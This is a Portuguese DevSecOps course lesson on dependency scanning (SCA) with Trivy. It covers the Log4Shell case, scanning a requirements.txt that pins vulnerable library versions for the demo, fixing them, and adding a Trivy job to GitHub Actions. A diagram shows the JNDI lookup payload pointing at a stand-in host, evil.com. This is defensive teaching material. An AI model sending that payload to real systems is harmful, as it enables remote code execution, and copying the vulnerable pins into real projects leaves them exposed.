# 🎬 Vídeo 3.2 - SCA com Trivy

**Aula**: 3 - SAST, SCA e SBOM  
**Vídeo**: 3.2  
**Temas**: SCA (Software Composition Analysis); Trivy; Análise de dependências; CVEs

---

## 📚 Parte 1: Por que SCA é Importante?

### Passo 1: A Realidade do Código Moderno

```mermaid
pie title "Composição de uma aplicação típica"
    "Seu código" : 20
    "Bibliotecas" : 80
```

**Fato**: ~80% do código de uma aplicação vem de bibliotecas de terceiros!

**Problema**: Se uma biblioteca tem vulnerabilidade, SUA aplicação tem vulnerabilidade.

---

### Passo 2: Caso Real - Log4Shell (CVE-2021-44228)

> 🔥 Uma das vulnerabilidades mais críticas da história da computação

**O que é Log4j?**
- Biblioteca Java para logging
- Usada em milhões de aplicações

**O que aconteceu?**
- Vulnerabilidade permitia **execução remota de código (RCE)**
- Atacante podia executar qualquer comando no servidor
- CVSS Score: **10.0** (máximo!)

**Timeline:**
```
24/Nov/2021 - Descoberta internamente
09/Dez/2021 - Divulgação pública
10/Dez/2021 - Exploração massiva já em andamento
```

**Por que foi tão grave?**
- Log4j estava em TUDO (Minecraft, iCloud, Twitter, Amazon)
- Empresas levaram **semanas** para descobrir onde usavam
- Sem inventário de dependências (SBOM), impossível reagir rápido

```mermaid
graph LR
    A[Atacante] -->|"${jndi:ldap://evil.com/x}"| B[App com Log4j]
    B -->|lookup JNDI| C[Servidor malicioso]
    C -->|código malicioso| B
    B -->|💀 executa| D[Servidor comprometido]
```

---

### Passo 3: O que é Trivy?

**Trivy** = Scanner de vulnerabilidades da Aqua Security

**Capacidades:**
- ✅ **Filesystem** (SCA) - Analisa dependências
- ✅ **Container Image** - Analisa imagens Docker
- ✅ **IaC** - Analisa Terraform, CloudFormation
- ✅ **SBOM** - Gera inventário de componentes

**Por que Trivy?**
- Open source e gratuito
- Muito rápido
- Atualização constante do banco de CVEs
- Fácil de usar

---

## 🔍 Parte 2: Executar SCA com Trivy

### Passo 4: Instalar Trivy

**Linux/Mac:**
```bash
# Via Homebrew (Mac)
brew install trivy

# Via script (Linux)
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Verificar instalação
trivy version
```

**Windows (PowerShell):**
```powershell
# Via Chocolatey
choco install trivy

# Verificar
trivy version
```

---

### Passo 5: Analisar requirements.txt

Primeiro, veja as dependências do projeto:

**Linux/Mac:**
```bash
cd ~/fiap-devsecops/fiap-dclt-devsecops-aula03
cat requirements.txt
```

**Conteúdo (com dependências vulneráveis para demonstração):**
```txt
Flask==2.3.0
Werkzeug==2.3.0
gunicorn==21.2.0
boto3==1.28.0

# Dependências com CVEs conhecidas (para demonstração)
urllib3==1.26.5      # CVE-2021-33503
Pillow==8.0.0        # Múltiplos CVEs
requests==2.25.0     # CVE-2023-32681
```

---

### Passo 6: Executar Scan de Dependências

**Linux/Mac:**
```bash
cd ~/fiap-devsecops/fiap-dclt-devsecops-aula03

# Scan de filesystem (SCA)
trivy fs .

# Scan com output JSON
trivy fs . --format json --output trivy-sca-results.json

# Scan focado em severidades altas
trivy fs . --severity HIGH,CRITICAL
```

**Windows (PowerShell):**
```powershell
cd ~\fiap-devsecops\fiap-dclt-devsecops-aula03

# Scan de filesystem (SCA)
trivy fs .

# Scan com output JSON
trivy fs . --format json --output trivy-sca-results.json

# Scan focado em severidades altas
trivy fs . --severity HIGH,CRITICAL
```

---

### Passo 7: Analisar Resultados

**Resultado esperado:**

```
requirements.txt (pip)
======================
Total: 5 (HIGH: 3, CRITICAL: 2)

┌─────────────┬────────────────┬──────────┬─────────────────────────────────────┐
│   Library   │ Vulnerability  │ Severity │              Title                  │
├─────────────┼────────────────┼──────────┼─────────────────────────────────────┤
│ urllib3     │ CVE-2021-33503 │ HIGH     │ Catastrophic backtracking in URL   │
│ Pillow      │ CVE-2022-22817 │ CRITICAL │ PIL.ImageMath.eval allows code exec │
│ Pillow      │ CVE-2022-24303 │ HIGH     │ Path traversal vulnerability        │
│ requests    │ CVE-2023-32681 │ HIGH     │ Unintended leak of proxy-auth header│
└─────────────┴────────────────┴──────────┴─────────────────────────────────────┘
```

---

### Passo 8: Corrigir Vulnerabilidades

A correção é simples: **atualizar as versões!**

**Atualizar requirements.txt:**
```txt
Flask==2.3.0
Werkzeug==2.3.0
gunicorn==21.2.0
boto3==1.28.0

# Versões corrigidas
urllib3>=2.0.0       # Corrigido
Pillow>=10.0.0       # Corrigido
requests>=2.31.0     # Corrigido
```

**Re-executar scan:**
```bash
trivy fs . --severity HIGH,CRITICAL
```

**Resultado esperado:**
```
Total: 0 (HIGH: 0, CRITICAL: 0)
```

---

### Passo 9: Usar .trivyignore

Para falsos positivos ou CVEs aceitas, use `.trivyignore`:

```bash
cat .trivyignore
```

**Conteúdo:**
```
# CVEs aceitas com justificativa
# CVE-2021-XXXXX - Não afeta nosso uso
# CVE-2022-XXXXX - Mitigado por configuração

# Exemplo:
# CVE-2023-12345
```

---

## 🔄 Parte 3: Adicionar SCA ao Pipeline

### Passo 10: Adicionar Job Trivy

**Editar `.github/workflows/security.yml`:**

**Linux/Mac:**
```bash
cat >> .github/workflows/security.yml << 'EOF'

  # ============================================
  # JOB: SCA com Trivy
  # ============================================
  trivy-sca:
    name: 🔍 SCA - Trivy
    runs-on: ubuntu-latest
    
    steps:
      - name: 📥 Checkout
        uses: actions/checkout@v4

      - name: 🔍 Trivy FS Scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'table'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # Falha se encontrar vulnerabilidades

      - name: 📤 Trivy JSON Report
        uses: aquasecurity/trivy-action@master
        if: always()
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'json'
          output: 'trivy-sca-results.json'

      - name: 📤 Upload Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: trivy-sca-report
          path: trivy-sca-results.json
EOF
```

---

### Passo 11: Commit e Push

**Linux/Mac:**
```bash
git add .github/workflows/security.yml
git commit -m "feat: adicionar SCA com Trivy"
git push origin main
```

**Windows (PowerShell):**
```powershell
git add .github/workflows/security.yml
git commit -m "feat: adicionar SCA com Trivy"
git push origin main
```

---

### Passo 12: Verificar Execução

1. GitHub > **Actions**
2. Workflow **Security Scan**
3. Verifique jobs:

```
✅ SAST - Horusec
✅ SCA - Trivy (ou ❌ se encontrou CVEs)
```

---

## 📊 Parte 4: Severidades CVSS

### Passo 13: Entender CVSS

**CVSS** = Common Vulnerability Scoring System

| Score | Severidade | SLA Sugerido |
|-------|------------|--------------|
| 9.0 - 10.0 | **CRITICAL** | 24 horas |
| 7.0 - 8.9 | **HIGH** | 7 dias |
| 4.0 - 6.9 | **MEDIUM** | 30 dias |
| 0.1 - 3.9 | **LOW** | 90 dias |

> 💡 Configure o Trivy para falhar apenas em CRITICAL e HIGH:
> `--severity CRITICAL,HIGH`

---

## 🔧 Troubleshooting

| Erro | Causa | Solução |
|------|-------|---------|
| `trivy: command not found` | Não instalado | Instalar via brew/choco |
| Scan muito lento | Primeiro download de DB | Aguardar, próximos são rápidos |
| CVE não reconhecida | DB desatualizado | `trivy image --download-db-only` |

---

## ✅ Checkpoint

Ao final deste vídeo você deve ter:

- [ ] Entender importância do SCA
- [ ] Conhecer o caso Log4Shell
- [ ] Trivy instalado
- [ ] Scan local executado
- [ ] Identificado CVEs nas dependências
- [ ] Atualizado dependências vulneráveis
- [ ] Job Trivy no pipeline

---

**FIM DO VÍDEO 3.2** ✅
